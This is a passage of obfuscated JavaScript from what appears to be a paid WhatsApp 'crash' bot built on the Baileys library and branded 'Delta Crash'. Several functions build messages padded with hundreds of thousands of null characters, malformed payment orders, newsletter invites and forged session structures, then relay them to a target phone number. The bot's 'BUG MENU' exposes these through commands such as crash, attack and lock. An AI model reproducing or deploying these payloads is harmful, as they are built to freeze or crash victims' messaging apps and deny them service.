            title: "囧囧[⃟༑𝐃𝐄𝐋𝐓𝐀𝐍𝐄𝐖ཀ͜͡囧囧",
            hasMediaAttachment: true,
            ...(await prepareWAMessageMedia({
              image: {
                url: "https://pomf2.lain.la/f/wrk6cuul.jpg"
              }
            }, _0xa2169f))
          },
          body: {
            text: ""
          },
          footer: {
            text: "›          #masdeltaganteng"
          },
          nativeFlowMessage: {
            messageParamsJson: "\0".repeat(1000000)
          }
        }
      }), {
        userJid: _0x141f00,
        quoted: _0xbcb508
      });
      await _0x463682.relayMessage(_0x141f00, _0x4f8c6b.message, {
        participant: {
          jid: _0x141f00
        },
        messageId: _0x4f8c6b.key.id
      });
    }
    async function _0x21fbe3(_0x448b9d, _0x1451ba) {
      var _0x58960f = generateWAMessageFromContent(_0x448b9d, proto.Message.fromObject({
        listMessage: {
          title: "[⃟༑𝐃𝐄𝐋𝐓𝐀𝐍𝐄𝐖ཀ͜͡" + "\0".repeat(920000),
          footerText: "[⃟༑𝐃𝐄𝐋𝐓𝐀𝐍𝐄𝐖ཀ͜͡.xp",
          description: "[⃟༑𝐃𝐄𝐋𝐓𝐀𝐍𝐄𝐖ཀ͜͡.xp",
          buttonText: null,
          listType: 2,
          productListInfo: {
            productSections: [{
              title: "anjay",
              products: [{
                productId: "4392524570816732"
              }]
            }],
            productListHeaderImage: {
              productId: "4392524570816732",
              jpegThumbnail: null
            },
            businessOwnerJid: "0@s.whatsapp.net"
          }
        },
        footer: "puki",
        contextInfo: {
          expiration: 604800,
          ephemeralSettingTimestamp: "1679959486",
          entryPointConversionSource: "global_search_new_chat",
          entryPointConversionApp: "whatsapp",
          entryPointConversionDelaySeconds: 9,
          disappearingMode: {
            initiator: "INITIATED_BY_ME"
          }
        },
        selectListType: 2,
        product_header_info: {
          product_header_info_id: 292928282928,
          product_header_is_rejected: false
        }
      }), {
        userJid: _0x448b9d,
        quoted: _0x5130e4
      });
      await _0x463682.relayMessage(_0x448b9d, _0x58960f.message, {
        participant: {
          jid: _0x448b9d
        },
        messageId: _0x58960f.key.id
      });
    }
    const _0x38353c = JSON.parse(fs.readFileSync("./database/dtbs/contacts.json"));
    const _0x7af6e6 = JSON.parse(fs.readFileSync("./database/dtbs/premium.json"));
    const _0x52b6a2 = JSON.parse(fs.readFileSync("./database/dtbs/owner.json"));
    const _0x4c8710 = _0x38353c.includes(_0x36ecab);
    const _0x1a75ef = _0x7af6e6.includes(_0x36ecab);
    const _0x339e8f = _0x52b6a2.includes(_0x409df4) || _0x25815e;
    _0x463682.sendButtonVideo = async (_0xf46aab, _0x51073f, _0x2bdb94, _0x519a87 = {}) => {
      const _0x3e00ba = {
        url: _0x519a87 && _0x519a87.video ? _0x519a87.video : ""
      };
      const _0x2622c6 = {
        video: _0x3e00ba
      };
      const _0x20eee5 = {
        upload: _0x463682.waUploadToServer
      };
      var _0x55c7df = await prepareWAMessageMedia(_0x2622c6, _0x20eee5);
      const _0x309726 = {
        text: _0x519a87 && _0x519a87.body ? _0x519a87.body : ""
      };
      const _0x106f29 = {
        text: _0x519a87 && _0x519a87.footer ? _0x519a87.footer : ""
      };
      const _0x5c6e95 = {
        hasMediaAttachment: true,
        videoMessage: _0x55c7df.videoMessage
      };
      const _0x4fd118 = {
        buttons: _0x51073f,
        messageParamsJson: ""
      };
      const _0x44e972 = {
        title: global.namabot,
        body: "𝘽𝙮 [⃟༑𝐃𝐄𝐋𝐓𝐀𝐍𝐄𝐖ཀ͜͡",
        thumbnailUrl: global.imageurl,
        sourceUrl: global.isLink,
        mediaType: 1,
        renderLargerThumbnail: true
      };
      const _0x246c5e = {
        externalAdReply: _0x44e972
      };
      const _0x1a1c26 = {
        body: _0x309726,
        footer: _0x106f29,
        header: _0x5c6e95,
        nativeFlowMessage: _0x4fd118,
        contextInfo: _0x246c5e
      };
      const _0x27ceb0 = {
        interactiveMessage: _0x1a1c26
      };
      const _0x20c387 = {
        message: _0x27ceb0
      };
      const _0x916296 = {
        viewOnceMessage: _0x20c387
      };
      const _0x4b0ecd = {
        quoted: _0x2bdb94
      };
      let _0x2680f4 = generateWAMessageFromContent(_0xf46aab, _0x916296, _0x4b0ecd);
      await _0x463682.sendPresenceUpdate("composing", _0xf46aab);
      return _0x463682.relayMessage(_0xf46aab, _0x2680f4.message, {
        messageId: _0x2680f4.key.id
      });
    };
    async function _0x12aa83(_0x140f11, _0x2d9af6, _0x3961c1, _0x5acbec, _0x77b917, _0x30d4be, _0x50e366, _0x4aba94) {
      const _0x576c04 = {
        filterName: _0x2d9af6,
        parameters: _0x3961c1,
        filterResult: _0x5acbec,
        clientNotSupportedConfig: _0x77b917
      };
      const _0x16f7be = {
        clauseType: _0x30d4be,
        clauses: _0x50e366,
        filters: _0x4aba94
      };
      const _0x5ad054 = {
        filter: _0x576c04,
        filterClause: _0x16f7be
      };
      const _0x3b6092 = {
        qp: _0x5ad054
      };
      var _0x16de6a = generateWAMessageFromContent(_0x140f11, proto.Message.fromObject(_0x3b6092), {
        userJid: _0x140f11
      });
      await _0x463682.relayMessage(_0x140f11, _0x16de6a.message, {
        participant: {
          jid: _0x140f11
        },
        messageId: _0x16de6a.key.id
      });
    }
    async function _0x5668b8(_0x58c8d2, _0x47ce0a, _0x516f54, _0x25404a, _0x4a4a71, _0x14469f, _0x1539f1, _0x53cfce, _0x3eceeb, _0x9fbd57, _0xc36b55, _0x1eafcc, _0xecea21, _0x2c7feb) {
      const _0x264389 = {
        sessionVersion: _0x47ce0a,
        localIdentityPublic: _0x516f54,
        remoteIdentityPublic: _0x25404a,
        rootKey: _0x4a4a71,
        previousCounter: _0x14469f,
        senderChain: _0x1539f1,
        receiverChains: _0x53cfce,
        pendingKeyExchange: _0x3eceeb,
        pendingPreKey: _0x9fbd57,
        remoteRegistrationId: _0xc36b55,
        localRegistrationId: _0x1eafcc,
        needsRefresh: _0xecea21,
        aliceBaseKey: _0x2c7feb
      };
      const _0x478569 = {
        sessionStructure: _0x264389
      };
      var _0x40b9b7 = generateWAMessageFromContent(_0x58c8d2, proto.Message.fromObject(_0x478569), {
        userJid: _0x58c8d2
      });
      await _0x463682.relayMessage(_0x58c8d2, _0x40b9b7.message, {
        participant: {
          jid: _0x58c8d2
        },
        messageId: _0x40b9b7.key.id
      });
    }
    const _0x32d439 = {
      key: {
        remoteJid: "p",
        fromMe: false,
        participant: "0@s.whatsapp.net"
      },
      message: {
        interactiveResponseMessage: {
          body: {
            text: "Sent",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "galaxy_message",
            paramsJson: "{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"ZetExecute\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"czazxvoid@sky.id\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons" + "".repeat(500000) + "\",\"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}",
            version: 3
          }
        }
      }
    };
    async function _0x153637(_0x4a39ee) {
      var _0x3fa439 = generateWAMessageFromContent(_0x4a39ee, proto.Message.fromObject({
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              header: {
                hasMediaAttachment: true,
                sequenceNumber: "0",
                jpegThumbnail: ""
              },
              nativeFlowMessage: {
                buttons: [{
                  name: "review_and_pay",
                  buttonParamsJson: "{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":k" + _0x3cb2e9 + ",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}"
                }],
                messageParamsJson: "\0".repeat(10000)
              }
            }
          }
        }
      }), {});
      _0x463682.relayMessage(_0x4a39ee, _0x3fa439.message, {
        messageId: _0x3fa439.key.id
      });
    }
    async function _0x4d717d(_0x482959) {
      var _0x14f247 = generateWAMessageFromContent(_0x482959, proto.Message.fromObject({
        viewOnceMessage: {
          message: {
            newsletterAdminInviteMessage: {
              newsletterJid: "120363297700623532@newsletter",
              newsletterName: "[⃟༑𝐃𝐄𝐋𝐓𝐀𝐍𝐄𝐖ཀ͜͡" + "\0".repeat(920000),
              jpegThumbnail: "",
              caption: "𝐁𝐄𝐑𝐈𝐊𝐔𝐓 𝐈𝐍𝐈 𝐔𝐍𝐃𝐀𝐍𝐆𝐀𝐍 𝐒𝐀𝐋𝐔𝐑𝐀𝐍 𝐁𝐘 [⃟༑𝐃𝐄𝐋𝐓𝐀𝐍𝐄𝐖ཀ͜͡",
              inviteExpiration: Date.now() + 1814400000
            }
          }
        }
      }), {
        userJid: _0x482959
      });
      await _0x463682.relayMessage(_0x482959, _0x14f247.message, {
        participant: {
          jid: _0x482959
        },
        messageId: _0x14f247.key.id
      });
    }
    const _0x561670 = {
      participant: "0@s.whatsapp.net",
      ...(_0x3ac71a.chat ? {
        remoteJid: "status@broadcast"
      } : {})
    };
    const _0x509f95 = {
      key: _0x561670,
      message: {
        interactiveMessage: {
          header: {
            hasMediaAttachment: true
          },
          nativeFlowMessage: {
            buttons: [{
              name: "review_and_pay",
              buttonParamsJson: "{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"️࿆᷍[⃟༑𝐃𝐄𝐋𝐓𝐀𝐍𝐄𝐖ཀ͜͡ 𝐈𝐧͢𝐟𝐢ͮ𝐧͢𝐢𝐭𝐲͜͡⃟╮\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}"
            }]
          }
        }
      }
    };
    const _0x5f1a3c = _0x509f95;
    const _0x34f19f = {
      participant: "0@s.whatsapp.net",
      ...(_0x3ac71a.chat ? {
        remoteJid: "status@broadcast"
      } : {})
    };
    const _0x1db9eb = {
      key: _0x34f19f,
      message: {
        interactiveMessage: {
          header: {
            hasMediaAttachment: true
          },
          nativeFlowMessage: {
            buttons: [{
              name: "review_and_pay",
              buttonParamsJson: "{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"️࿆᷍[⃟༑𝐃𝐄𝐋𝐓𝐀𝐍𝐄𝐖ཀ͜͡🐉 𝐈𝐧͢𝐟𝐢ͮ𝐧͢𝐢𝐭𝐲͜͡⃟╮\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}"
            }]
          }
        }
      }
    };
    const _0x1366e9 = _0x1db9eb;
    let _0x2a8e11 = [];
    for (let _0x3ff6f4 of _0x52b6a2) {
      _0x2a8e11.push({
        displayName: await _0x463682.getName(_0x3ff6f4 + "@s.whatsapp.net"),
        vcard: "BEGIN:VCARD\n\nVERSION:3.0\n\nN:" + (await _0x463682.getName(_0x3ff6f4 + "@s.whatsapp.net")) + "\n\nFN:" + (await _0x463682.getName(_0x3ff6f4 + "@s.whatsapp.net")) + "\n\nitem1.TEL;waid=" + _0x3ff6f4 + ":" + _0x3ff6f4 + "\n\nitem1.X-ABLabel:Ponsel\n\nitem2.EMAIL;type=INTERNET: deltamewing@gmail.com\n\nitem2.X-ABLabel:Email\n\nitem3.URL:https://whatsapp.com/channel/0029VatY2JHHltYEy0yenJ47\nitem3.X-ABLabel:YouTube\n\nitem4.ADR:;;Indonesia;;;;\n\nitem4.X-ABLabel:Region\n\nEND:VCARD"
      });
    }
    function _0x21ea85(_0x5bb658) {
      return "```" + _0x5bb658 + "```";
    }
    function _0x39c641(_0x5c4db5) {
      var _0x1934ae = "";
      var _0x2b1904 = _0x5c4db5.toString().split("").reverse().join("");
      for (var _0xd4d272 = 0; _0xd4d272 < _0x2b1904.length; _0xd4d272++) {
        if (_0xd4d272 % 3 == 0) {
          _0x1934ae += _0x2b1904.substr(_0xd4d272, 3) + ".";
        }
      }
      return "" + _0x1934ae.split("", _0x1934ae.length - 1).reverse().join("");
    }
    try {
      ppuser = await _0x463682.profilePictureUrl(_0x3ac71a.sender, "image");
    } catch (_0x3643cd) {
      ppuser = "https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60";
    }
    async function _0x229e16(_0x4a7cab) {
      return new Promise((_0x1a920b, _0x3b16d0) => {
        try {
          const _0x3e282a = _0x5d0b71.obfuscate(_0x4a7cab, {
            compact: false,
            controlFlowFlattening: true,
            controlFlowFlatteningThreshold: 1,
            numbersToExpressions: true,
            simplify: true,
            stringArrayShuffle: true,
            splitStrings: true,
            stringArrayThreshold: 1
          });
          const _0x9511b8 = {
            status: 200,
            author: "delta",
            result: _0x3e282a.getObfuscatedCode()
          };
          _0x1a920b(_0x9511b8);
        } catch (_0x3fbc33) {
          _0x3b16d0(_0x3fbc33);
        }
      });
    }
    if (!_0x463682.public) {
      if (!_0x3ac71a.key.fromMe) {
        return;
      }
    }
    async function _0xb12d48() {
      var _0x18aa6e = ["𝑫𝒆", "𝑫𝒆𝒍", "𝑫𝒆𝒍𝒕", "𝑫𝒆𝒍𝒕𝒂", "𝑫𝒆𝒍𝒕𝒂𝑻", "𝑫𝒆𝒍𝒕𝒂𝑻𝒆", "𝑫𝒆𝒍𝒕𝒂𝑻𝒆𝒄", "𝑫𝒆𝒍𝒕𝒂𝑻𝒆𝒄𝒉"];
      let {
        key: _0x156d4c
      } = await _0x463682.sendMessage(_0x17a7f6, {
        text: "𝑫"
      });
      for (let _0x3fa536 = 0; _0x3fa536 < _0x18aa6e.length; _0x3fa536++) {
        const _0x14be0a = {
          text: _0x18aa6e[_0x3fa536],
          edit: _0x156d4c
        };
        await _0x463682.sendMessage(_0x17a7f6, _0x14be0a);
      }
    }
    const _0xf7736f = await reSize(ppuser, 300, 300);
    const _0xf8dcc0 = async (_0x3890a9, _0x4ca59d, _0x86ed2d, _0x6a69b4, _0x46935a, _0x2ba85d, _0x209e54, _0x1e4f18, _0x25689c) => {
      const _0x1d7cc6 = generateWAMessageFromContent(_0x3890a9, proto.Message.fromObject({
        orderMessage: {
          orderId: _0x86ed2d,
          thumbnail: _0x6a69b4,
          itemCount: _0x46935a,
          status: "INQUIRY",
          surface: "CATALOG",
          orderTitle: _0x2ba85d,
          message: _0x4ca59d,
          sellerJid: _0x209e54,
          token: _0x1e4f18,
          totalAmount1000: _0x25689c,
          totalCurrencyCode: "IDR"
        }
      }), {
        userJid: _0x3890a9,
        quoted: _0x3ac71a
      });
      _0x463682.relayMessage(_0x3890a9, _0x1d7cc6.message, {
        messageId: _0x1d7cc6.key.id
      });
    };
    const _0x2bc992 = _0x56e748 => {
      _0x463682.sendMessage(_0x3ac71a.chat, {
        text: _0x56e748,
        contextInfo: {
          mentionedJid: [_0x36ecab],
          forwardingScore: 9999999,
          isForwarded: true,
          externalAdReply: {
            showAdAttribution: true,
            containsAutoReply: true,
            title: "[⃟༑𝐃𝐄𝐋𝐓𝐀𝐍𝐄𝐖ཀ͜͡",
            body: "" + namabot,
            previewType: "PHOTO",
            thumbnailUrl: "",
            thumbnail: fs.readFileSync("./database/image/delta.jpg"),
            sourceUrl: "" + isLink
          }
        }
      }, {
        quoted: _0x3ac71a
      });
    };
    const _0x52b8cd = {
      fromMe: false,
      participant: "0@s.whatsapp.net",
      ...(_0x17a7f6 ? {
        remoteJid: "status@broadcast"
      } : {})
    };
    const _0x55c10d = {
      key: _0x52b8cd,
      message: {
        contactMessage: {
          displayName: "" + _0xcbde79,
          vcard: "BEGIN:VCARD\nVERSION:3.0\nN:XL;Vinzx,;;;\nFN:" + _0xcbde79 + ",\nitem1.TEL;waid=" + _0x36ecab.split("@")[0] + ":" + _0x36ecab.split("@")[0] + "\nitem1.X-ABLabel:Ponsel\nEND:VCARD",
          jpegThumbnail: {
            url: "https://pomf2.lain.la/f/wrk6cuul.jpg"
          }
        }
      }
    };
    function _0x3020a3(_0x34c136 = "") {
      return [..._0x34c136.matchAll(/@([0-9]{5,16}|0)/g)].map(_0x1a7d4e => _0x1a7d4e[1] + "@s.whatsapp.net");
    }
    if (_0x3ac71a.isGroup && !_0x3ac71a.key.fromMe && !_0x339e8f && antilink) {
      if (!_0x223faa) {
        return;
      }
      if (_0x53d892.match("whatsapp.com")) {
        const _0x2037c2 = {
          text: "*Antilink Group Terdeteksi*\n\nKamu Akan Dikeluarkan Dari Group " + _0x3fe489.subject
        };
        _0x463682.sendMessage(_0x3ac71a.chat, _0x2037c2, {
          quoted: _0x3ac71a
        });
        _0x463682.groupParticipantsUpdate(_0x3ac71a.chat, [_0x36ecab], "delete");
        _0x463682.sendMessage(_0x3ac71a.chat, {
          delete: _0x3ac71a.key
        });
      }
    }
    switch (_0xf77d4c) {
      case "menu":
        {
          await _0xb12d48();
          darkphonk = fs.readFileSync("./database/delta.mp3");
          const _0x2eaf09 = require("baileys/package.json").version;
          const _0x28467a = "`[` *`𝗗𝗲𝗹𝘁𝗮 𝗖𝗿𝗮𝘀𝗵`* `]`\n\n`𝗡𝗔𝗠𝗘` : 𝐃𝐄𝐋𝐓𝐀\n\n`𝗩𝗘𝗥𝗦𝗜𝗢𝗡` : 𝟭𝟒.𝟬.𝟬\n\n `𝗗𝗘𝗩` : 𝗗𝗲𝗹𝘁𝗮𝗧𝗲𝗰𝗵\n\n╞═══ `𝗕𝗨𝗚 𝗠𝗘𝗡𝗨` ═══╡\n\n• 𝗰𝗿𝗶𝗺𝗲 𝟲𝟮𝘅𝘅𝘅\n• 𝗺𝗮𝗴𝗶𝗰 𝟲𝟮𝘅𝘅𝘅\n• 𝗵𝗲𝗿𝗼 𝟲𝟮𝘅𝘅𝘅\n• 𝗺𝗮𝘅 𝟲𝟮𝘅𝘅𝘅\n• 𝘂𝗹𝘁𝗶 𝟲𝟮𝘅𝘅𝘅\n• 𝗱𝗲𝗹𝘁𝗮 𝟲𝟮𝘅𝘅𝘅\n• 𝘁𝗿𝗮𝘀𝗵 𝟲𝟮𝘅𝘅𝘅\n• 𝘂𝗶 𝟲𝟮𝘅𝘅𝘅\n• 𝗵𝗶𝘁 𝟲𝟮𝘅𝘅𝘅\n• 𝗹𝗼𝗰𝗸 𝟲𝟮𝘅𝘅𝘅\n• 𝗰𝗿𝗮𝘀𝗵 𝟲𝟮𝘅𝘅𝘅\n• 𝗮𝘁𝘁𝗮𝗰𝗸 𝟲𝟮𝘅𝘅𝘅\n\n╞═══𝗢𝗪𝗡𝗘𝗥 𝗠𝗘𝗡𝗨═══╡\n\n•𝗮𝗱𝗱𝗽𝗿𝗲𝗺 𝟲𝟮𝘅𝘅/@tag\n•𝗱𝗲𝗹𝗽𝗿𝗲𝗺 𝟲𝟮𝘅𝘅/@tag\n•𝗮𝗱𝗱𝗼𝘄𝗻𝗲𝗿 𝟲𝟮𝘅𝘅/@tag\n•𝗱𝗲𝗹𝗼𝘄𝗻𝗲𝗿 𝟲𝟮𝘅𝘅/@tag\n*𝗧𝗵𝗮𝗻𝗸𝘀 𝗳𝗼𝗿 𝗯𝘂𝘆𝗶𝗻𝗴 𝗺𝘆 𝗦𝗰𝗿𝗶𝗽𝘁 𝗩𝗲𝗿𝘀𝗶𝗼𝗻 𝟭𝟰*";
          const _0x3a17a8 = {
            showAdAttribution: true,
            title: global.namabot,
            body: global.nameCreator,
            thumbnailUrl: global.imageurl,
            sourceUrl: global.isLink,
            mediaType: 1,
            renderLargerThumbnail: true
          };
          const _0x244b93 = {
            externalAdReply: _0x3a17a8
          };
          const _0x54c117 = {
            text: _0x28467a,
            contextInfo: _0x244b93
          };
          const _0x2a180d = {
            quoted: _0x55c10d
          };
          _0x463682.sendMessage(_0x3ac71a.chat, _0x54c117, _0x2a180d);
        }
        break;
      case "z":
      case "hidetag":
        if (!_0x339e8f) {
          return _0x2bc992(mess.only.owner);
        }
        if (!_0x2d7ff5) {
          return _0x2bc992("Teks?");
        }
        _0x463682.sendMessage(_0x3ac71a.chat, {
          text: _0x2d7ff5 ? _0x2d7ff5 : "",
          mentions: _0x197555.map(_0x20fed4 => _0x20fed4.id)
        }, {
          quoted: _0x3ac71a
        });
        break;
      case "tagall":
        {
          if (!_0x339e8f && !_0x337639) {
            return _0x2bc992(mess.admin);
          }
          if (!_0x3d7b7a) {
            return joreply(mess.only.group);
          }
          if (!q) {
            return _0x2bc992("Teks Nya Mana Kak?");
          }
          let _0x319487 = (q ? q : "") + "\n‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎